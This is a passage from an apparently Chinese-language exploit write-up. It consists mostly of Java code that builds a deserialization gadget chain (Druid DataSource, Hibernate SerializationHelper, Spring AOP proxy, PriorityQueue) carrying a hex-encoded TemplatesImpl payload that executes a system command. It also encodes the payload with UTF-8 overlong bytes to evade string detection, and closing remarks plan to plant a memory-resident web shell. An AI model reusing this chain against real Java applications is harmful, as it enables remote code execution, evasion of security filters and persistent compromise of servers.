466163746f72793b4c000a6173706563744e616d657400124c6a6176612f6c616e672f537472696e673b4c000e6465636c6172696e67436c6173737400114c6a6176612f6c616e672f436c6173733b4c001e646973636f766572656452657475726e696e6747656e65726963547970657400184c6a6176612f6c616e672f7265666c6563742f547970653b4c0017646973636f766572656452657475726e696e675479706571007e001f4c0016646973636f76657265645468726f77696e675479706571007e001f4c000a6d6574686f644e616d6571007e001e5b000e706172616d65746572547970657371007e00094c0008706f696e7463757474003b4c6f72672f737072696e676672616d65776f726b2f616f702f6173706563746a2f4173706563744a45787072657373696f6e506f696e746375743b4c000d72657475726e696e674e616d6571007e001e4c000c7468726f77696e674e616d6571007e001e78700000000000ffffffffffffffff70707372003e6f72672e737072696e676672616d65776f726b2e616f702e6173706563746a2e53696e676c65746f6e417370656374496e7374616e6365466163746f7279a7b53180af2734b40200014c000e617370656374496e7374616e63657400124c6a6176612f6c616e672f4f626a6563743b78707372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c61737371007e00094c00055f6e616d6571007e001e4c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b787000000000ffffffff757200035b5b424bfd19156767db37020000787000000001757200025b42acf317f8060854e00200007870000001a4cafebabe00000037001b01000a4d7954656d706c6174650700010100106a6176612f6c616e672f4f626a65637407000301000a536f7572636546696c6501000f4d7954656d706c6174652e6a617661010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740700070100083c636c696e69743e010003282956010004436f64650100116a6176612f6c616e672f52756e74696d6507000c01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c000e000f0a000d001001000463616c6308001201000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c001400150a000d00160100063c696e69743e0c0018000a0a0008001900210002000800000000000200080009000a0001000b00000016000200000000000ab800111213b6001757b10000000000010018000a0001000b0000001100010001000000052ab7001ab10000000000010005000000020006707400077573656c65737370770100787400007671007e002670767200106a6176612e6c616e672e4f626a6563740000000000000000000000787071007e00327400136765744f757470757450726f70657274696573757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a99020000787000000000737200396f72672e737072696e676672616d65776f726b2e616f702e6173706563746a2e4173706563744a45787072657373696f6e506f696e74637574e0091a2803398f1e0200044c000b6265616e466163746f727974002f4c6f72672f737072696e676672616d65776f726b2f6265616e732f666163746f72792f4265616e466163746f72793b4c0018706f696e746375744465636c61726174696f6e53636f706571007e001f5b0016706f696e74637574506172616d657465724e616d657371007e001c5b0016706f696e74637574506172616d65746572547970657371007e00097872003a6f72672e737072696e676672616d65776f726b2e616f702e737570706f72742e416273747261637445787072657373696f6e506f696e746375748ca282d0d5c12a500200024c000a65787072657373696f6e71007e001e4c00086c6f636174696f6e71007e001e787070707070757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007870000000007571007e0034000000007070737200176a6176612e7574696c2e4c696e6b656448617368536574d86cd75a95dd2a1e020000787200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000103f4000000000000078787371007e00130000000077040000000078737200306f72672e737072696e676672616d65776f726b2e616f702e7461726765742e456d707479546172676574536f757263653313be4e325cb31b0200025a000869735374617469634c000b746172676574436c61737371007e001f787001707571007e003400000003767200236f72672e737072696e676672616d65776f726b2e616f702e537072696e6750726f787900000000000000000000007870767200296f72672e737072696e676672616d65776f726b2e616f702e6672616d65776f726b2e4164766973656400000000000000000000007870767200286f72672e737072696e676672616d65776f726b2e636f72652e4465636f726174696e6750726f787900000000000000000000007870770400000003737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000017371007e004a0000000278";
        DruidDataSource druidDataSource = new DruidDataSource();
        druidDataSource.setUrl("jdbc:hsqldb:mem:test");
        druidDataSource.setValidationQuery("call \"org.hibernate.internal.util.SerializationHelper.deserialize\"(X'"+s+"')");
        druidDataSource.setUsername("sa");
        druidDataSource.setPassword("");
        druidDataSource.setInitialSize(1);
        druidDataSource.setLogWriter(null);
        druidDataSource.setStatLogger(null);
        setFieldValue(druidDataSource, "initedLatch", null);
        Field transactionHistogram = DruidAbstractDataSource.class.getDeclaredField("transactionHistogram");
        transactionHistogram.setAccessible(true);
        transactionHistogram.set(druidDataSource, null);
        
        /// AspectJAroundAdvice#invoke -> AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs -> xxx#yyy() spring-aop
        AspectJAroundAdvice aspectJAroundAdvice = new AspectJAroundAdvice(DruidDataSource.class.getDeclaredMethod("getConnection"), new AspectJExpressionPointcut(),new SingletonAspectInstanceFactory(druidDataSource)); // 调用任意对象的无参方法 LdapAttribute#getAttributeDefinition()

        /// Proxy#xxx(除了equals,hashcode) -> JdkDynamicAopProxy#invoke -> ReflectiveMethodInvocation#proceed -> AspectJAroundAdvice#invoke spring-aop
        DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor(aspectJAroundAdvice);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.addAdvisor(advisor);
        Constructor JdkDynamicAopProxyconstructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        JdkDynamicAopProxyconstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) JdkDynamicAopProxyconstructor.newInstance(advisedSupport);
        Comparator o = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, handler);

        /// PriorityQueue#readObject -> compare java原生
        PriorityQueue priorityQueue = new PriorityQueue();
        setFieldValue(priorityQueue,"comparator",o);
        setFieldValue(priorityQueue,"queue",new Object[]{1,2}); // compareObject.compare(1,2)
        setFieldValue(priorityQueue,"size",2);

        /// UTF8Overlong绕过字符串检测
        System.out.println(Base64.getEncoder().encodeToString(new UTF8BytesMix(serialize(priorityQueue)).builder()));

    }
    public static void setFieldValue(Object obj, String field, Object val) throws Exception{
        Field dField = obj.getClass().getDeclaredField(field);
        dField.setAccessible(true);
        dField.set(obj, val);
    }
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        return baos.toByteArray();
    }
}
```

成功

![Image](https://github.com/user-attachments/assets/48f44c9b-dbd2-4134-86eb-646f98ddd48c)

但是我们还要打内存马才有回显，这里直接抄一个内存马就可以了

![Image](https://github.com/user-attachments/assets/ba9c4471-815d-45b9-9245-c8b242eba001)